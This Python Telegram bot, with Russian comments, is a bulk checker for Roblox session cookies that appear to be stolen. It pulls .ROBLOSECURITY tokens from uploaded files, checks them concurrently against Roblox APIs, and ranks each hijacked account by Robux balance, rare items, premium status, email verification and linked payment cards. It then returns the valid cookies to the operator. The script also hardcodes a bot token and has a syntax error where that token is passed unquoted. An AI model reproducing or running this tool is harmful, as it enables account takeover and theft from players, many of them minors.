import telebot
import requests
import time
import re
import os
import logging
import threading
from datetime import datetime

# Настройки
TOKEN = "7687759121:AAFBy2qiyQvPMxB77zCCDfB0uSUthWM3znU"
bot = telebot.TeleBot(7687759121:AAFBy2qiyQvPMxB77zCCDfB0uSUthWM3znU)

logging.basicConfig(level=logging.INFO)

MAX_COOKIES = 10000  # Максимальное количество куков для обработки
REQUEST_DELAY = 0.5  # Уменьшенный интервал между запросами
MAX_THREADS = 10  # Максимальное количество потоков

# Регулярное выражение для поиска куков
COOKIE_PATTERN = re.compile(r'\|\s*_\|WARNING:-DO-NOT-SHARE-THIS\.[^|]+\|_([A-Za-z0-9]+)')

# Глобальные переменные для хранения результатов
valid_cookies = []
invalid_count = 0
error_count = 0
lock = threading.Lock()  # Блокировка для безопасного доступа к общим данным

def safe_request(url, headers, max_retries=3):
    """Безопасный запрос с повторными попытками"""
    for _ in range(max_retries):
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 429:
                time.sleep(5)  # Задержка при лимите запросов
                continue
            elif response.status_code in [403, 401]:
                return None  # Cookie невалидна
        except requests.RequestException as e:
            logging.error(f"Ошибка запроса: {str(e)}")
            time.sleep(2)
    return None

def check_cookie(cookie):
    """Проверка куки и получение данных пользователя"""
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }

    user_data = safe_request("https://users.roblox.com/v1/users/authenticated", headers)
    if not user_data:
        return None

    user_id = user_data.get("id")
    username = user_data.get("name", "Unknown")

    result = {
        "username": username,
        "cookie": cookie,
        "balance": 0,
        "pending": 0,
        "donate": 0,
        "badges": 0,
        "passes": 0,
        "premium": False,
        "email_verified": user_data.get("hasVerifiedEmail", False),
        "korblox": False,
        "headless": False,
        "rap": 0,
        "pin_enabled": False,
        "cards": 0
    }

    # Баланс и Pending
    balance_data = safe_request("https://economy.roblox.com/v1/user/currency", headers)
    if balance_data:
        result["balance"] = balance_data.get("robux", 0)
        result["pending"] = balance_data.get("pendingRobux", 0)

    # Донаты за год
    donate_data = safe_request(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year", headers)
    if donate_data:
        result["donate"] = donate_data.get("total", 0)

    # Значки
    badges_data = safe_request(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", headers)
    if badges_data:
        result["badges"] = len(badges_data.get("data", []))

    # Game Passes
    passes_data = safe_request(f"https://games.roblox.com/v1/users/{user_id}/games?sortOrder=Asc", headers)
    if passes_data:
        result["passes"] = passes_data.get("total", 0)

    # Премиум-статус
    premium_data = safe_request("https://premiumfeatures.roblox.com/v1/user/premium-status", headers)
    if premium_data:
        result["premium"] = premium_data.get("isPremium", False)

    # RAP (Collectibles)
    collectibles = safe_request(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers)
    if collectibles:
        result["rap"] = sum(asset.get('recentAveragePrice', 0) for asset in collectibles.get('data', []))

    # Korblox Check
    korblox_items = safe_request(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/48474213,48474253", headers)
    if korblox_items and korblox_items.get('data'):
        result["korblox"] = len(korblox_items['data']) > 0

    # Headless Check
    headless_item = safe_request(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/1367848", headers)
    if headless_item and headless_item.get('data'):
        result["headless"] = len(headless_item['data']) > 0

    # Payment Methods
    payment_methods = safe_request("https://billing.roblox.com/v1/payment-methods", headers)
    if payment_methods:
        result["cards"] = len(payment_methods.get('data', []))

    return result

def process_cookie(cookie):
    """Обработка одной куки в отдельном потоке"""
    global valid_cookies, invalid_count, error_count
    try:
        result = check_cookie(cookie)
        with lock:
            if result:
                valid_cookies.append(result)
            else:
                invalid_count += 1
    except Exception as e:
        with lock:
            error_count += 1
        logging.error(f"Ошибка при проверке куки: {e}")
    finally:
        time.sleep(REQUEST_DELAY)

@bot.message_handler(commands=["start"])
def send_welcome(message):
    bot.send_message(message.chat.id, "🔒 Отправь cookie или .txt файл с куками для проверки")

@bot.message_handler(content_types=["document"])
def handle_file(message):
    try:
        start_time = time.time()
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode("utf-8", errors="replace")
        cookies = COOKIE_PATTERN.findall(file_content)[:MAX_COOKIES]

        if not cookies:
            return bot.send_message(message.chat.id, "❌ В файле нет валидных куков!")

        bot.send_message(message.chat.id, f"⚠️ Найдено {len(cookies)} куков. Начинаю проверку...")

        # Очистка глобальных переменных
        global valid_cookies, invalid_count, error_count
        valid_cookies = []
        invalid_count = 0
        error_count = 0

        # Создание потоков
        threads = []
        for cookie in cookies:
            thread = threading.Thread(target=process_cookie, args=(cookie,))
            threads.append(thread)
            thread.start()

            # Ограничение количества одновременно работающих потоков
            while threading.active_count() > MAX_THREADS:
                time.sleep(0.1)

        # Ожидание завершения всех потоков
        for thread in threads:
            thread.join()

        end_time = time.time()
        time_taken = end_time - start_time

        # Агрегация данных
        total_checked = len(cookies)
        valid_count = len(valid_cookies)
        total_robux = sum(acc['balance'] for acc in valid_cookies)
        total_pending = sum(acc['pending'] for acc in valid_cookies)
        total_rap = sum(acc['rap'] for acc in valid_cookies)
        total_donate = sum(acc['donate'] for acc in valid_cookies)
        premium_count = sum(1 for acc in valid_cookies if acc['premium'])
        korblox_count = sum(1 for acc in valid_cookies if acc['korblox'])
        headless_count = sum(1 for acc in valid_cookies if acc['headless'])
        email_not_verified = sum(1 for acc in valid_cookies if not acc['email_verified'])
        pin_enabled = sum(1 for acc in valid_cookies if acc['pin_enabled'])
        cards_count = sum(1 for acc in valid_cookies if acc['cards'] > 0)

        # Формирование сообщения
        result_message = f"""
📄 Полные результаты проверки

📊 Основная статистика
├ Всего проверено: {total_checked}
├ Валидных: {valid_count}
├ Невалидных: {invalid_count}
└ Ошибок: {error_count}

💰 Подробная статистика
├ Общий Robux: {total_robux} R$
├ Общий Pending: {total_pending} R$
├ Общий RAP: {total_rap} R$
├ Общий донат: {total_donate} R$
├ Общий баланс: {total_robux + total_pending} R$
├ Premium: {premium_count}
├ Korblox: {korblox_count}
├ Headless: {headless_count}
├ Email не подтверждён: {email_not_verified}
├ PIN-код: {pin_enabled}
└ Привязана карта: {cards_count}

⏱ Время проверки: {time_taken:.2f} секунд.
        """
        bot.send_message(message.chat.id, result_message)

        # Сохранение результатов в файл
        if valid_cookies:
            filename = f"results_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                for acc in valid_cookies:
                    f.write(f"""
👤 Ник: {acc['username']}
🔑 Cookie: {acc['cookie']}
💰 Баланс: {acc['balance']} R$
⏳ Pending: {acc['pending']} R$
🎁 Донат за год: {acc['donate']} R$
🏆 RAP: {acc['rap']} R$
🏅 Бейджи: {acc['badges']}
🎟 Пасспорты: {acc['passes']}
✨ Premium: {"✅" if acc['premium'] else "❌"}
📧 Email: {"✅" if acc['email_verified'] else "❌"}
🎖 Korblox: {"✅" if acc['korblox'] else "❌"}
👤 Headless: {"✅" if acc['headless'] else "❌"}
💳 Карты: {acc['cards']}

------------------------------------
""")
            with open(filename, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"✅ Валидных аккаунтов: {len(valid_cookies)}")
            os.remove(filename)

    except Exception as e:
        logging.error(f"Ошибка: {e}")
        bot.send_message(message.chat.id, "⚠️ Произошла ошибка при обработке файла")

if __name__ == "__main__":
    bot.polling(none_stop=True)
